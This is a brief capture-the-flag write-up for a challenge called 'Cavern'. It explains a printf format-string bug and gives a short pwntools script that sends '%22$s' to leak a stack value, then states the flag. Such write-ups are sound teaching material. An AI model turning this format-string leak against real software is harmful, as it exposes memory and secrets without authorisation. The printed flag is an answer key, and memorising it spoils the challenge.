# Cavern

## Description
I found yet _another_ binary that prints stuff. Maybe you can do something with it?

## Solution
Here's a quick `pwntools` script (you need to `pip install pwntools` if you don't have it). Since the binary passes a format string as the first argument to `printf()`, we can read nearly arbitrary data off the stack via `%N$s`, so we can leak the special value to get the flag.

```python
from pwn import *

elf = ELF("./cavern")
context.binary = elf
context.log_level = "debug"

io = process([elf.path])
io.clean()
io.sendline("%22$s")
print(io.clean().decode())
```

Flag: `gigem{4rb1tr4ry_r34d_g0_brr}`
